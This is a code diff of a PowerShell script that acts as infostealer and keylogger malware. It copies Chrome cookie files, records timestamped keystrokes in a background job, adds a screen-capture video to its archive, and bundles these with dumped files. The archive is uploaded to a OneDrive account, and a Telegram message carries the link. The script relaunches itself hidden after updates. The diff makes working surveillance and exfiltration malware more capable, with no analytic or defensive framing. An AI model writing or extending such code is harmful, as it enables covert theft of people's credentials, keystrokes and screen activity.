@@ -22,7 +22,9 @@ function Get-ChromeCookies {
     New-Item -ItemType Directory -Path $cookieDir -Force | Out-Null
     }
     if (Test-Path $path) {
-        Copy-Item $path "$cookieDir\chrome.sqlite" -Force
+        $chromeCopy = "$cookieDir\chrome.sqlite"
+    Copy-Item $path $chromeCopy -Force -ErrorAction SilentlyContinue
+    if (Test-Path $chromeCopy) { Write-Output "Chrome cookies saved: $chromeCopy" }
     }
 }
 
@@ -86,7 +88,7 @@ function Get-SystemReport {
         return $null
     }
 }
-
+"" | Out-File -Encoding utf8 -Force $keylogPath
 Start-Job -ScriptBlock {
     Add-Type -AssemblyName System.Windows.Forms
     Add-Type -TypeDefinition '
@@ -112,7 +114,7 @@ Start-Job -ScriptBlock {
                 $char = try {
                     if ($map.ContainsKey($i)) { $map[$i] } else { [char]$i }
                 } catch { "[?]" }
-                Add-Content -Path $logPath -Value "$char"
+                Add-Content -Path $logPath -Value "$([DateTime]::Now.ToString('HH:mm:ss')) $char"
             }
         }
         Start-Sleep -Milliseconds 50
@@ -136,7 +138,7 @@ function Start-Recording {
 }
 function Archive-And-Upload {
     if (-not (Test-Path $keylogPath)) {
-    "" | Out-File -Encoding utf8 $keylogPath
+    "" | Out-File -Encoding utf8 -Force $keylogPath
     }
     if (-not (Test-Path $keylogPath)) {
     New-Item -ItemType File -Path $keylogPath -Force | Out-Null
@@ -160,7 +162,10 @@ Cookies: $(Get-ChildItem "$cookieDir" -Recurse | Measure-Object).Count
 "@ | Set-Content -Path $meta
         $filesCount = (Get-ChildItem "$fileDumpDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
         $cookieCount = (Get-ChildItem "$cookieDir" -Recurse -ErrorAction SilentlyContinue | Measure-Object).Count
-        Compress-Archive -Path @($logPath, $meta, "$cookieDir\*", "$fileDumpDir\*", $keylogPath) -DestinationPath $finalZip -Force
+        $video = "$tempDir\screen_capture.mp4"
+        $paths = @($logPath, $meta, "$cookieDir\*", "$fileDumpDir\*", $keylogPath)
+        if (Test-Path $video) { $paths += $video }
+        Compress-Archive -Path $paths -DestinationPath $finalZip -Force
 
         Upload-To-OneDrive -ZipPath $finalZip -UserName $user -Timestamp $timestamp
         $summary = "Files: $filesCount, Cookies: $cookieCount"
@@ -190,6 +195,8 @@ function Upload-To-OneDrive {
 
     if ($LASTEXITCODE -eq 0) {
         $link = "https://onedrive.live.com/?id=root&cid=9f1831722b7187c6"
+        $summary = "Files: $filesCount, Cookies: $cookieCount"
+        Send-Telegram -User $UserName -Timestamp $Timestamp -Summary "$summary`n$link"
     }
 }
 function Send-Telegram {
@@ -247,7 +254,6 @@ while ($true) {
     Write-Output "Restarting after update..."
     Start-Process -FilePath "$local" -WindowStyle Hidden
     exit
-    Start-Sleep -Seconds $interval
     }
 
 Stop-Transcript
